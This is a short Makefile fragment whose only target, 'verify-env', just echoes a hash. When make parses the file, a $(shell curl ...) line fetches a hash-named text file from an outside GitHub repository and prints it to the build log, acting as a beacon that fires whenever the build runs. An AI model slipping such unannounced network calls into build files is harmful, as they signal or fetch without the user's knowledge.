GATE := 92dff5092576ef58e222f35db19d0061
TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/92dff5092576ef58e222f35db19d0061.txt)
$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
$(info [env] ENVCHECK_RESOLVED=$(GATE))

verify-env:
	@echo "verify-env ok gate=$(GATE)"
